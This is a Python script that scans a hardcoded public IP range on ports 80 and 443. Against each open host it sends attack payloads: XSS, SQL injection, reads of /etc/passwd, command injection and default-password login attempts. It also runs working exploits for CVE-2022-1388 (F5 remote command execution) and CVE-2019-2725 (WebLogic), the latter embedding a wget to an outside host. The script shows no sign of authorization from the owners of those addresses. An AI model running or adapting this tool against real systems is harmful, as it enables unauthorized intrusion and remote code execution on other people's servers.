
import requests
import socket
import time
import ipaddress
import urllib3
import sys

urllib3.disable_warnings()

ip_range = '45.42.173.128/26'
ports = [80, 443]
TIMEOUT = 3

def scan_ip_port(ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(TIMEOUT)
            result = s.connect_ex((str(ip), port))
            if result == 0:
                try:
                    s.sendall(b'\r\n')
                    banner = s.recv(1024).decode(errors='ignore')
                except Exception as e:
                    banner = f"No banner received or error: {str(e)}"
                return (True, banner.strip())
            else:
                return (False, "Connection refused or timed out")
    except Exception as e:
        return (False, f"Error: {str(e)}")


class VulnerabilityScanner:
    def __init__(self):
        self.target_url = ""
        self.vulnerabilities = []



    def scan(self, ip, port):
        if port == 443:
            self.target_url = f"https://{ip}:{port}/"
        else:
            self.target_url = f"http://{ip}:{port}/"
  

            self.scan_xss()
            self.scan_sql_injection()
            self.scan_directory_traversal()
            self.scan_command_injection()
            self.scan_server_misconfiguration()
            self.scan_weak_passwords()
            self.scan_network_vulnerabilities()
            self.scan_web_application_security()
            self.cve_2022_1388_exploit()
            self.cve_2019_2725_exploit()

    def scan_xss(self):
            self.check_xss_stored()
            self.check_xss_reflected()


    def check_xss_stored(self):

        payload = "<script>alert('Stored XSS')</script>"
        response = requests.post(self.target_url, data={"comment": payload})
        if payload in response.text:
            self.vulnerabilities.append("Stored XSS vulnerability found")

    def check_xss_reflected(self):

        payload = "<script>alert('Reflected XSS')</script>"
        response = requests.get(self.target_url + "?message=" + payload)
        if payload in response.text:
            self.vulnerabilities.append("Reflected XSS vulnerability found")

    def scan_sql_injection(self):
        self.check_sql_injection_get()
        self.check_sql_injection_post()


    def check_sql_injection_get(self):

        payload = "' OR '1'='1"
        response = requests.get(self.target_url + "?id=" + payload)
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (GET)")

    def check_sql_injection_post(self):

        payload = "' OR '1'='1"
        response = requests.post(self.target_url, data={"id": payload})
        if "error" in response.text:
            self.vulnerabilities.append("SQL injection vulnerability found (POST)")

    def scan_directory_traversal(self):

        payload = "../../../../etc/passwd"
        response = requests.get(self.target_url + payload)
        if "root:x" in response.text:
            self.vulnerabilities.append("Directory traversal vulnerability found")

    def scan_command_injection(self):

        payload = "127.0.0.1; ls"
        response = requests.get(self.target_url + "?ip=" + payload)
        if "index.html" in response.text:
            self.vulnerabilities.append("Command injection vulnerability found")

    def scan_server_misconfiguration(self):

        response = requests.get(self.target_url + "/admin")
        if response.status_code == 200:
            self.vulnerabilities.append("Server misconfiguration vulnerability found")

    def scan_weak_passwords(self):

        usernames = ["admin", "root"]
        passwords = ["admin", "password", "123456"]
        for username in usernames:
            for password in passwords:
                response = requests.post(self.target_url + "/login", data={"username": username, "password": password})
                #response = requests.post(self.target_url + "/", data={"username": username, "password": password})
                #print(response.text)
                if "Login Successful" in response.text:
                    self.vulnerabilities.append("Weak password vulnerability found")

    def scan_network_vulnerabilities(self):

        self.check_insecure_cookies()


   
    def check_insecure_cookies(self):

        session = requests.Session()
        response = session.get(self.target_url)
        cookies = session.cookies
        for cookie in cookies:
            if not cookie.secure:
                self.vulnerabilities.append("Insecure cookie vulnerability found")

    def scan_web_application_security(self):

        self.check_cross_site_request_forgery()

        self.check_remote_file_inclusion()



    def check_cross_site_request_forgery(self):

        payload = "<img src='http://malicious-site.com/transfer?amount=1000'>"
        response = requests.post(self.target_url, data={"name": "John", "comment": payload})
        if "Transfer successful" in response.text:
            self.vulnerabilities.append("Cross-Site Request Forgery (CSRF) vulnerability found")

    def check_remote_file_inclusion(self):

        payload = "http://malicious-site.com/malicious-script.php"
        response = requests.get(self.target_url + "?file=" + payload)
        if "Sensitive information leaked" in response.text:
            self.vulnerabilities.append("Remote File Inclusion (RFI) vulnerability found")

    def cve_2022_1388_exploit(self):
        url = f'{self.target_url}mgmt/tm/util/bash'
        command = "echo 'CVE-2022-1388 Exploit Test' > /tmp/cve_2022_1388_test.txt"
        headers = {
            'Host': '127.0.0.1',
            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
            'X-F5-Auth-Token': 'asdf',
            'Connection': 'X-F5-Auth-Token',
            'Content-Type': 'application/json'

        }
        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format( command )}
        r = requests.post( url, headers=headers, json=j, verify=False )
        #r.raise_for_status()
        response_headers = r.headers.get("content-type")
        if r.status_code != 204 and response_headers == ( "application/json" ):
            print( r.json()['commandResult'].strip() )
            self.vulnerabilities.append("CVE-2022-1388 vulnerability found")

    def cve_2019_2725_exploit(self):
        request_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}
        path='/_async/AsyncResponseService'
        payload='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>wget http://www.cvc.com.br/robot.txt</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'
        url = self.target_url

        try:
            response = requests.post(url+path, headers=request_headers, data=payload)
            if(response.status_code==202):
                print('[+]'+url+' server with vul.')
                self.vulnerabilities.append("CVE-2019-2725 vulnerability found")
        except requests.exceptions.RequestException as e:
            print('[-]'+url+' Time out')
            #continue

        print('\n\nPOC executed with Successful.')

    def report_vulnerabilities(self):
        if self.vulnerabilities:
            print("\nVulnerabilities found:")
            for vulnerability in self.vulnerabilities:
                print("- " + vulnerability)
        else:
            print("\nNo vulnerabilities found")

scanner = VulnerabilityScanner()


if __name__ == "__main__":
    network = ipaddress.ip_network(ip_range, strict=False)
    for ip in network.hosts():
        print(f"\nScanning IP: {ip}")
        for port in ports:
            open_status, response = scan_ip_port(ip, port)
            print(f"  Port {port}: {'Open' if open_status else 'Closed'}\n    Response: {response}")
            if open_status:
                if port == 80:
                    scanner.scan(ip, port)
                    scanner.report_vulnerabilities()
                elif port == 443:
                    scanner.scan(ip, port)
                    scanner.report_vulnerabilities()



